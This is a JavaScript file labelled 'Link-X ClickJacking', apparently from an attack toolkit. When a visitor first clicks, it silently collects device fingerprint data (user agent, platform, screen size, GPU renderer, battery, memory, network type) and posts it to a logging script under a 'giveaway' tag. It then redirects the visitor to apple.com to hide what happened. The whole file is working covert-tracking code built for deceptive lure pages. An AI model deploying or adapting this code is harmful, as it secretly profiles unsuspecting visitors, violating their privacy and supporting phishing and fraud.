// Link-X ClickJacking — Accurate Android Version Only
// Author: Mr.X | Tool: Link-X v1.0

(function () {
  function getDeviceName() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;

    if (/iPhone/.test(ua)) return "Apple iPhone";
    if (/iPad/.test(ua)) return "Apple iPad";
    if (/iPod/.test(ua)) return "Apple iPod";
    if (/Macintosh|MacIntel/.test(platform)) return "Apple Mac";

    // Ekstrak versi Android secara akurat
    const androidMatch = ua.match(/Android[\s\/]([0-9\.]+)/i);
    if (androidMatch) {
      let version = androidMatch[1];
      if (version.endsWith('.0') && version.split('.').length === 2) {
        version = version.replace(/\.0$/, '');
      }
      return `Android ${version}`;
    }

    if (/Android/i.test(ua)) {
      return "Android (unknown version)";
    }

    if (/Win/.test(platform)) return "Windows PC";
    if (/Linux/.test(platform)) {
      if (/CrOS/.test(ua)) return "Google Chromebook";
      return "Linux Device";
    }

    return "Unknown Device";
  }

  async function collectFullDeviceInfo() {
    const baseInfo = {
      time: new Date().toLocaleString(),
      dname: getDeviceName(), // ✅ Sekarang hanya: "Android 13", "Apple iPhone", dll
      cookie: navigator.cookieEnabled ? "Enabled" : "Disabled",
      ua: navigator.userAgent,
      platf: navigator.platform,
      lang: navigator.language,
      wid: screen.width,
      hig: screen.height,
      touch: navigator.maxTouchPoints || "0",
      netType: navigator.connection?.effectiveType || "unknown",
      memory: navigator.deviceMemory ? (navigator.deviceMemory + " GB") : "unknown",
      renderer: "None",
      batLevel: "unknown",
      batCharge: "unknown"
    };

    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) baseInfo.renderer = gl.getParameter(gl.RENDERER) || "Unknown";
    } catch (e) { /* ignore */ }

    if ('getBattery' in navigator) {
      try {
        const battery = await navigator.getBattery();
        baseInfo.batLevel = (battery.level * 100).toFixed(1) + "%";
        baseInfo.batCharge = battery.charging ? "Yes" : "No";
      } catch (e) { /* ignore */ }
    }

    return baseInfo;
  }

  setTimeout(() => {
    document.addEventListener('click', async function handleClick(e) {
      document.removeEventListener('click', handleClick);

      const deviceInfo = await collectFullDeviceInfo();

      const payload = {
        info: {
          ...deviceInfo,
          clickX: e.clientX,
          clickY: e.clientY,
          clickTime: new Date().toISOString(),
          eventType: "clickjacking_giveaway"
        }
      };

      try {
        await fetch('log_click.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      } catch (err) { /* tetap redirect */ }

      window.location.href = "https://www.apple.com/";
    }, { once: true });
  }, 300);
})();